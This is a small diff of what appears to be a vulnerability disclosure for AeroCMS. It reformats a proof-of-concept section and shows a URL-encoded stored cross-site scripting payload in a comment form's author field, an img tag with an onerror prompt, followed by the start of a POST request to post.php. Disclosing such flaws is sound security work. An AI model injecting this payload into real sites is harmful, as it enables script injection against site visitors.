@@ -12,7 +12,10 @@
 ![image](https://user-images.githubusercontent.com/79050415/157009805-fc9c33bb-7ae9-4229-9051-081c23d72b92.png)
 # Vulnerable Code
 # POC
-* Injection point `comment_author=%3Cimg%2Fsrc%2Fonerror%3Dprompt%2810%29%3E&comment_email=bin%40gmail.com&comment_content=hacked&create_comment=`
+* `Injection Point` 
+```c
+comment_author=%3Cimg%2Fsrc%2Fonerror%3Dprompt%2810%29%3E&comment_email=bin%40gmail.com&comment_content=hacked&create_comment=
+```
 * Request
 ```c
 POST /AeroCMS/post.php?p_id=36 HTTP/1.1
